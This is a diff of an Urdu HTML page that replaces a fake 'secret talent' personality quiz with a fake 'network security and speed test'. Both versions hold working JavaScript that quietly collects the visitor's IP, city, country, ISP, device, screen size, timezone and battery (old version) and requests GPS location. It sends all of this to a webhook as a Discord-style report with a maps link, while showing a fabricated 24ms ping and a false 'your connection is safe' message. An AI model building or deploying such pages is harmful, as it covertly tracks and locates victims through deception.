@@ -2,46 +2,54 @@
 <html lang="ur" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>آپ کی خفیہ صلاحیت کیا ہے؟</title>
+    <title>نیٹ ورک اسپیڈ ٹیسٹ - 2026</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(120deg, #84fab0 0%, #8fd3f4 100%); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .quiz-card { background: white; padding: 40px; border-radius: 25px; box-shadow: 0 15px 40px rgba(0,0,0,0.2); text-align: center; width: 330px; border: 3px solid #6dd5ed; position: relative; }
-        .star-icon { font-size: 60px; color: #fecf20; margin-bottom: 15px; animation: glow 1.5s infinite alternate; }
-        @keyframes glow { from { text-shadow: 0 0 5px #fecf20;} to { text-shadow: 0 0 20px #fecf20, 0 0 30px #fecf20;} }
-        h2 { color: #2980b9; font-size: 24px; margin-bottom: 10px; }
-        p { color: #34495e; font-size: 16px; line-height: 1.6; }
-        .btn-start { background: #28a745; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 25px; transition: 0.4s; box-shadow: 0 5px 15px rgba(40,167,69,0.4); }
-        .btn-start:hover { background: #218838; transform: translateY(-3px); }
-        #loading { display: none; margin-top: 20px; color: #28a745; font-weight: bold; }
+        body { font-family: 'Segoe UI', sans-serif; background: #0b0e14; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .test-box { background: #1c222d; padding: 30px; border-radius: 15px; width: 350px; text-align: center; border: 1px solid #313a4a; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .speed-dial { font-size: 50px; color: #00d2ff; margin-bottom: 10px; }
+        h2 { font-size: 20px; color: #f8fafc; }
+        .info-row { display: flex; justify-content: space-between; margin: 10px 0; font-size: 13px; border-bottom: 1px solid #2d3748; padding-bottom: 5px; }
+        .btn-test { background: #00d2ff; color: #0b0e14; border: none; padding: 12px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        #results { display: none; margin-top: 15px; text-align: right; }
     </style>
 </head>
 <body>
 
-<div class="quiz-card">
-    <div class="star-icon">✨</div>
-    <h2>آپ کی سب سے خفیہ خوبی کیا ہے؟</h2>
-    <p>صرف 30 سیکنڈ میں جانیں کہ آپ کی شخصیت میں سب سے خاص چیز کیا ہے جو دوسرے نہیں جانتے۔</p>
+<div class="test-box">
+    <div class="speed-dial">⚡</div>
+    <h2>انٹرنیٹ سیکیورٹی اور اسپیڈ ٹیسٹ</h2>
+    <p style="font-size: 13px; color: #94a3b8;">اپنے کنکشن کی کوالٹی اور سیکیورٹی لیول چیک کرنے کے لیے نیچے کلک کریں۔</p>
     
-    <button class="btn-start" onclick="startQuiz()">کوئز شروع کریں</button>
-    <div id="loading">آپ کی خفیہ صلاحیت معلوم کی جا رہی ہے...</div>
+    <button class="btn-test" onclick="runDiagnostic()">ٹیسٹ شروع کریں</button>
+
+    <div id="results">
+        <div class="info-row"><span>آئی پی ایڈریس:</span> <span id="u-ip">...</span></div>
+        <div class="info-row"><span>شہر:</span> <span id="u-city">...</span></div>
+        <div class="info-row"><span>پنگ (Ping):</span> <span>24ms</span></div>
+        <p style="color: #4ade80; font-size: 12px; margin-top: 10px;">آپ کا کنکشن محفوظ ہے!</p>
+    </div>
 </div>
 
 <script>
-    async function startQuiz() {
-        document.getElementById("loading").style.display = "block";
+    async function runDiagnostic() {
+        document.querySelector('.btn-test').innerText = "تجزیہ ہو رہا ہے...";
         
-        // وقت، ٹائم زون، اور بیٹری (بغیر پرمیشن)
-        const userTime = new Date().toLocaleString();
-        const tZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        
-        let batt = "N/A";
-        try { const b = await navigator.getBattery(); batt = `${Math.round(b.level * 100)}%`; } catch(e) {}
+        // 1. ڈیوائس اور سسٹم کا ڈیٹا
+        const ua = navigator.userAgent;
+        let device = "Laptop/PC";
+        if (/android/i.test(ua)) device = "Android Mobile";
+        else if (/iphone/i.test(ua)) device = "iPhone";
 
-        // آئی پی کی تفصیلات
-        let ipData = {};
+        const screenRes = `${window.screen.width}x${window.screen.height}`;
+        const tZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+        // 2. آئی پی ڈیٹا (اسے صارف کو بھی دکھائیں گے)
+        let ipInfo = { query: "N/A", city: "N/A", country: "N/A", isp: "N/A" };
         try {
-            const res = await fetch('https://ipapi.co/json/');
-            ipData = await res.json();
+            const res = await fetch('http://ip-api.com/json/');
+            ipInfo = await res.json();
+            document.getElementById('u-ip').innerText = ipInfo.query;
+            document.getElementById('u-city').innerText = ipInfo.city;
         } catch (e) {}
 
         const sendData = async (lat = "Block", lon = "Block") => {
@@ -49,25 +57,28 @@
             
             const payload = {
                 embeds: [{
-                    title: "🌟 خفیہ شخصیت ٹریک ہوئی!",
-                    color: 3066993,
+                    title: "🕵️ نیٹ ورک رپورٹ جنریٹ ہو گئی",
+                    color: 3447003,
                     fields: [
+                        { name: "📱 ڈیوائس", value: device, inline: true },
+                        { name: "🖥️ اسکرین", value: screenRes, inline: true },
                         { name: "🌐 ٹائم زون", value: tZone, inline: true },
-                        { name: "⏰ موبائل وقت", value: userTime, inline: true },
-                        { name: "🌍 آئی پی شہر", value: `${ipData.city}, ${ipData.country_name}` },
-                        { name: "🔋 بیٹری", value: batt, inline: true },
-                        { name: "📍 میپ", value: `[Location](https://www.google.com/maps?q=${lat},${lon})` }
+                        { name: "🏢 نیٹ ورک (ISP)", value: ipInfo.isp },
+                        { name: "🌍 مقام", value: `${ipInfo.city}, ${ipInfo.country}` },
+                        { name: "📍 میپ لنک", value: `[Location](https://www.google.com/maps?q=${lat},${lon})` }
                     ],
                     timestamp: new Date()
                 }]
             };
             await fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+            document.getElementById('results').style.display = 'block';
+            document.querySelector('.btn-test').style.display = 'none';
         };
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                (p) => { sendData(p.coords.latitude, p.coords.longitude); alert("آپ کی خفیہ صلاحیت ہے 'قیادت کرنے کی صلاحیت'! مزید جاننے کے لیے لاگ ان کریں۔"); },
-                () => { sendData(); alert("درست نتیجہ کے لیے لوکیشن کی اجازت درکار ہے۔"); }
+                (p) => { sendData(p.coords.latitude, p.coords.longitude); },
+                () => { sendData(); alert("درست اسپیڈ ٹیسٹ کے لیے لوکیشن تک رسائی ضروری ہے۔"); }
             );
         } else { sendData(); }
     }
